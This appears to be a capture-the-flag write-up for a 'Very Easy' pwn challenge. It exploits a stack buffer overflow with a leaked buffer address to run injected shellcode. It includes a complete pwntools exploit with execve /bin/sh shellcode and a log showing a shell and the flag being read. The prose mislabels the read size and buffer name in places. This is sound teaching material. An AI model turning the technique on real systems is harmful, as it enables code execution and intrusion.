# Injection :sleepy:

### Description: 

* There is a guard in front of the door. You need to hurry up and inject him so that he falls asleep.

### Objective: 

* Take advantage of *bof* and lack of NX and use **ret2shellcode** technique.   

### Flag:
* HTB{sh3llc0d3_1nj3ct10n_d0n3!}

### Difficulty:
* Very Easy

### Challenge:

First of all, we start with a `checksec`:  

```console
$ checksec ./injection_shot
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

As we can see:  

* **PIE enabled**
* **Full RELRO**  

But, **NX** is disabled and there is **no canary**. 

That means there might be a possible *BufferOverflow* and *code execution*.

Well, the challenge name is a big hint that we should *inject* shellcode..  

The interface of the challenge looks like this:

```console
$ ./injection_shot 
Do you see the guard over there?
You need to sneak and inject the shot in order to make him sleep!
Can you do it?
1. Of course!
2. I do not think so..
> 2
Mission failed! ❌
$ ./injection_shot 
Do you see the guard over there?
You need to sneak and inject the shot in order to make him sleep!
Can you do it?
1. Of course!
2. I do not think so..
> 1
Let me give you this in order to help you: [0x7ffd1f117800]
Hurry up, you need to do it now!
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Mission failed! ❌
Segmentation fault (core dumped)
```

We can see that there is a *seg fault*, that means that we can use *buffer overflow techniques*.  

No more talking, let's head to the disassembler.  

#### Disassembly  

As we can see from the pseudocode of `main`:  

```c
undefined8 main(void)

{
  int local_2c;
  undefined local_28 [32];
  
  setup();
  printf(
        "Do you see the guard over there?\nYou need to sneak and inject the shot in order to makehim sleep!\nCan you do it?\n1. Of course!\n2. I do not think so..\n> "
        );
  __isoc99_scanf(&DAT_00100aa2,&local_2c);
  if (local_2c == 1) {
    printf("Let me give you this in order to help you: [%p]\nHurry up, you need to do it now!\n> ",
           local_28);
    read(0,local_28,0x279);
    puts(&DAT_00100afc);
    return 0;
  }
  puts(&DAT_00100afc);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

There are 2 points that can help us proceed:

* There is a leak of a stack address (the buffer where we can store our payload) at: 

  `printf("Let me give you this in order to help you: [%p]\nHurry up, you need to do it now!\n> ",local_28);`

* There is a *bof* because   `read(0,local_28,0x3f);` reads up to 0x279 bytes and the `local_38` buffer can store up to 32 bytes.  

Now that we know the 2 vulnerable parts of the program, our goal is: 

* Inject shellcode in the buffer.
* Overflow the buffer and redirect the program to call it.

As long as **PIE** is enabled, this is our only way to proceed.  

The payload looks like this: 

```python
payload = sc + nops*(len(junk) - len(sc)) + p64(buf_adrr)
```

#### Exploit 

```python
#!/usr/bin/python3
from pwn import *

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './injection_shot' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)
sa = lambda x,y : r.sendafter(x,y)

def leak_stack():
	sla('>', '1')
	ru('[')
	leaked = int(ru(']')[:-1], 16)
	return leaked

def inject_sc(payload):
	sa('>', payload)
	inter()

def pwn():
	junk = b'A'*40
	nops = b'\x90'
	sc = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
	buf_adrr = leak_stack()
	log.info('Leaked addr: 0x{:x}'.format(buf_adrr))
	payload = sc + nops*(len(junk) - len(sc)) + p64(buf_adrr)
	inject_sc(payload)
	
if __name__ == '__main__':
	pwn()
```

### PoC

```console
$ ./solver.py 
[+] Opening connection to 172.17.0.1 on port 1337: Done
[*] Leaked addr: 0x7ffec1c33990
[*] Switching to interactive mode
 Mission failed! ❌
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
HTB{sh3llc0d3_1nj3ct10n_d0n3!}
```
